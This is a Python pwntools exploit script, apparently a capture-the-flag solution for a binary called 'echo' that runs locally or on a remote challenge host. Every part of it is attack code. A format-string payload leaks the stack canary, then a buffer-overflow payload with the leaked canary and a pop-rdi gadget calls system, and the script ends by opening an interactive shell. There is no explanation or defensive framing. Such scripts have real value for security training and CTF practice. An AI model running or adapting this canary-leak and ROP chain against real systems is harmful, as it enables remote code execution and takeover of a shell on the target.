from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["172.31.2.190",50004]
#libc=ELF('')
elf=ELF('./echo')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./echo")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

printf_got = elf.got['printf']
system_plt = elf.plt['system']
pop_rdi = 0x400903

#gdb.attach(p)
ru(b'>')
payload = b'%11$p'
sl(payload)
str = rl()
canary = int(str,16)
pr("canary",canary)
ru(b'>')
payload2 = b'a' * 0x18 + p64(canary) + b'a' * 8 + p64(pop_rdi) + p64(0x400928) + p64(0x400796)
s(payload2)
ru(b'>')
s(b'quit')

shell()
